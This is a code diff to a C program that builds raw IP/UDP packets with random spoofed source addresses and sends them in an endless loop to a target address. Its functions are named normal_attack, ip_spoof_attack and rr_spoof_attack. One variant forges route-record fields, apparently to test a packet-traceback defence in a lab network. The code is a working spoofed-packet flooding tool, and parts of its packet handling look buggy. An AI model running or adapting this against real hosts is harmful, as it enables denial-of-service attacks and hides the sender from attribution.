@@ -4,6 +4,8 @@
 #include<arpa/inet.h>
 #include<sys/socket.h>
 #include <unistd.h>
+#include <linux/netfilter.h>
+#include <libnetfilter_queue/libnetfilter_queue.h>
 #include "netfilter.h"
 
 #include <netinet/ip.h>
@@ -12,7 +14,52 @@
 #define BUFLEN 512  //Max length of buffer
 #define PORT 8080   //The port on which to send data
 
+struct psd_udp {
+  struct in_addr src;
+  struct in_addr dst;
+  unsigned char pad;
+  unsigned char proto;
+  unsigned short udp_len;
+  struct udphdr udp;
+};
 
+unsigned short in_cksum(unsigned short *addr, int len)
+{
+  int nleft = len;
+  int sum = 0;
+  unsigned short *w = addr;
+  unsigned short answer = 0;
+
+  while (nleft > 1) {
+    sum += *w++;
+    nleft -= 2;
+  }
+
+  if (nleft == 1) {
+    *(unsigned char *) (&answer) = *(unsigned char *) w;
+    sum += answer;
+  }
+  
+  sum = (sum >> 16) + (sum & 0xFFFF);
+  sum += (sum >> 16);
+  answer = ~sum;
+  return (answer);
+}
+
+unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len)
+{
+  struct psd_udp buf;
+
+  memset(&buf, 0, sizeof(buf));
+  buf.src.s_addr = src;
+  buf.dst.s_addr = dst;
+  buf.pad = 0;
+  buf.proto = IPPROTO_UDP;
+  buf.udp_len = htons(len);
+  memcpy(&(buf.udp), addr, len);
+  return in_cksum((unsigned short *)&buf, 12 + len);
+}
+  
 
 void normal_attack(char* victim_ip){
   struct sockaddr_in dest;
@@ -44,9 +91,8 @@ void normal_attack(char* victim_ip){
 }
 
 void ip_spoof_attack(char* victim_ip){
-  int PDEST = 45034;
-  int PSOURCE = 28392;
   int sock_fd;
+  srand(time(NULL));
 
   sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
@@ -54,54 +100,63 @@ void ip_spoof_attack(char* victim_ip){
     perror("Fail to create raw socket!\n");
   }
 
-  struct sockaddr_in daddr, saddr;
-  char packet[BUFLEN];
-  /* point the iphdr to the beginning of the packet */
-  struct iphdr *ip = (struct iphdr *)packet; 
-  struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
+  struct iphdr ip;
+  struct udphdr udp;
+  int sd;
+  const int on = 1;
+  struct sockaddr_in sin;
+  u_char *packet;
+  
+  uint32_t ul_dst;
+  uint32_t random_num;
 
-  daddr.sin_family = AF_INET;
-  saddr.sin_family = AF_INET;
-  daddr.sin_port = htons(PDEST); 
-  saddr.sin_port = htons(PSOURCE); 
-  inet_pton(AF_INET, victim_ip, (struct in_addr *)&daddr.sin_addr.s_addr);
-  //inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
+  packet = (u_char *)malloc(60);
+  
+  while (1) {
+    ip.ihl = 0x5;
+    ip.version = 0x4;
+    ip.tos = 0x0;
+    ip.tot_len = 60;
+    ip.id = 0;
+    ip.frag_off = 0x0;
+    ip.ttl = 64;
+    ip.protocol = IPPROTO_UDP;
+    ip.check = 0x0;
+    
+    random_num = rand();
+    ul_dst = (random_num >> 24 & 0xFF) << 24 | 
+            (random_num >> 16 & 0xFF) << 16 | 
+            (random_num >> 8 & 0xFF) << 8 | 
+            (random_num & 0xFF);
+    ip.saddr = ul_dst;
+    //printf("%u\n",ul_dst);
+    
+    ip.daddr = inet_addr(victim_ip);
+    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
+    memcpy(packet, &ip, sizeof(ip));
 
-  ip->ihl = 5; //header length
-  ip->version = 4;
-  ip->tos = 0x0;
-  ip->id = 0;
-  ip->frag_off = htons(0x4000); /* DF */
-  ip->ttl = 64; /* default value */
-  ip->protocol = 17; //IPPROTO_RAW;  /* protocol at L4 */
-  ip->check = 0; /* not needed in iphdr */
-  ip->daddr = daddr.sin_addr.s_addr;
+    udp.uh_sport = htons(45512);
+    udp.uh_dport = htons(53512);
+    udp.uh_ulen = htons(8);
+    udp.uh_sum = 0;
+    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
+    memcpy(packet + 20, &udp, sizeof(udp));
 
-  udp->source = htons(PSOURCE);
-  udp->dest = htons (PDEST);
-
-  char *msg = "You are under attack!";
-  memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
-
-  int sizeudpdata = sizeof(struct udphdr) + strlen(msg);
-  int sizeIpData = sizeudpdata + sizeof(struct iphdr);
-  ip->tot_len = htons(sizeIpData); /* 16 byte value */
-  udp->len = htons(sizeudpdata);
-  udp->check = 0;
-
-  srand(time(NULL));
-
-  while(1){
-    ip->saddr = rand();
-    sendto(sock_fd, packet, sizeIpData, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
+    //char *msg = "You are under attack!";
+    //memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
+    
+    memset(&sin, 0, sizeof(sin));
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = ip.daddr;
+    
+    sendto(sock_fd, packet, 60, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
     sleep(1);
   }
 }
  
 void rr_spoof_attack(char* victim_ip){
-  int PDEST = 45034;
-  int PSOURCE = 28392;
   int sock_fd;
+  srand(time(NULL));
 
   sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
@@ -109,55 +164,75 @@ void rr_spoof_attack(char* victim_ip){
     perror("Fail to create raw socket!\n");
   }
 
-  struct sockaddr_in daddr, saddr;
-  char packet[BUFLEN];
-  /* point the iphdr to the beginning of the packet */
-  struct iphdr *ip = (struct iphdr *)packet; 
-  struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));
-
-  daddr.sin_family = AF_INET;
-  saddr.sin_family = AF_INET;
-  daddr.sin_port = htons(PDEST); 
-  saddr.sin_port = htons(PSOURCE); 
-  inet_pton(AF_INET, victim_ip, (struct in_addr *)&daddr.sin_addr.s_addr);
-  //inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);
-
-  ip->ihl = 5; //header length
-  ip->version = 4;
-  ip->tos = 0x0;
-  ip->id = 0;
-  ip->frag_off = htons(0x4000); /* DF */
-  ip->ttl = 64; /* default value */
-  ip->protocol = 17; //IPPROTO_RAW;  /* protocol at L4 */
-  ip->check = 0; /* not needed in iphdr */
-  ip->daddr = daddr.sin_addr.s_addr;
-
-  udp->source = htons(PSOURCE);
-  udp->dest = htons(PDEST);
-
-  char *msg = "You are under attack!\n";
-  memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
-
-  int sizeudpdata = sizeof(struct udphdr) + strlen(msg);
-  int sizeIpData = sizeudpdata + sizeof(struct iphdr);
-  ip->tot_len = htons(sizeIpData); /* 16 byte value */
-  udp->len = htons(sizeudpdata);
-  udp->check = 0;
-
-  srand(time(NULL));
-
-  struct iphdr *newpacket = (struct iphdr *)add_shim(packet, &sizeIpData);
-  Shim* shim = (void*) newpacket + sizeof(struct iphdr);
-  struct in_addr rr_spoof_addr;
-  rr_spoof_addr.s_addr = 0x0a0a807a;
-  //rr_spoof_addr.s_addr = 0x12345678;
-  assign_addr(&shim->route_record[0].addr, &rr_spoof_addr);
+  struct iphdr ip;
+  struct udphdr udp;
+  int sd;
+  const int on = 1;
+  struct sockaddr_in sin;
+  u_char *packet;
+  
+  uint32_t ul_dst;
+  uint32_t random_num;
   int rr_spoof_hash = 0;
-  while(1){
+
+  packet = (u_char *)malloc(60);
+  
+  while (1) {
+    ip.ihl = 0x5;
+    ip.version = 0x4;
+    ip.tos = 0x0;
+    ip.tot_len = 60;
+    ip.id = 0;
+    ip.frag_off = 0x0;
+    ip.ttl = 64;
+    ip.protocol = IPPROTO_UDP;
+    ip.check = 0x0;
+    
+    random_num = rand();
+    ul_dst = (random_num >> 24 & 0xFF) << 24 | 
+            (random_num >> 16 & 0xFF) << 16 | 
+            (random_num >> 8 & 0xFF) << 8 | 
+            (random_num & 0xFF);
+    ip.saddr = ul_dst;
+    //printf("%u\n",ul_dst);
+    
+    ip.daddr = inet_addr(victim_ip);
+//    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
+//    memcpy(packet, &ip, sizeof(ip));
+
+    udp.uh_sport = htons(45512);
+    udp.uh_dport = htons(53512);
+    udp.uh_ulen = htons(8);
+    udp.uh_sum = 0;
+//    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
+//    memcpy(packet + 20, &udp, sizeof(udp));
+
+    //char *msg = "You are under attack!";
+    //memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
+    
+    memset(&sin, 0, sizeof(sin));
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = ip.daddr;
+    
+    int pkt_size = 60;
+    struct iphdr *newpacket = (struct iphdr *)add_shim(packet, &pkt_size);
+    Shim *shim = (void *)newpacket + sizeof(struct iphdr);
+    struct in_addr rr_spoof_addr;
+    rr_spoof_addr.s_addr = 0x0a0a807a;
+    assign_addr(&shim->route_record[0].addr, &rr_spoof_addr);
+    
     (shim->route_record[0].hash_value) = rr_spoof_hash;
     rr_spoof_hash++;
-    ip->saddr = rand();
-    sendto(sock_fd, newpacket, sizeIpData, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
+    
+    printf("Expected size: 116, Actual size: %d\n", pkt_size);
+    
+    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
+    memcpy(packet, &ip, sizeof(ip));
+    memcpy(packet + 20, shim, sizeof(Shim));
+    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
+    memcpy(packet + 20 + pkt_size, &udp, sizeof(udp)); 
+                                                       
+    sendto(sock_fd, newpacket, 116, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
     sleep(1);
   }
 }
@@ -180,15 +255,15 @@ int main(int argc, char *argv[])
   
   if (*argv[1] == '0') {
     //normal_attack("192.14.121.23");
-    normal_attack("127.0.0.1");
+    normal_attack("10.10.128.150");
   }
   else if (*argv[1] == '1') {
     //ip_spoof_attack("192.14.121.23");
-    ip_spoof_attack("127.0.0.1");
+    ip_spoof_attack("10.10.128.150");
   }
   else if (*argv[1] == '2') {
     //rr_spoof_attack("192.14.121.23");
-    rr_spoof_attack("127.0.0.1");
+    rr_spoof_attack("10.10.128.150");
   }
   else {
     print_invalid_arg();
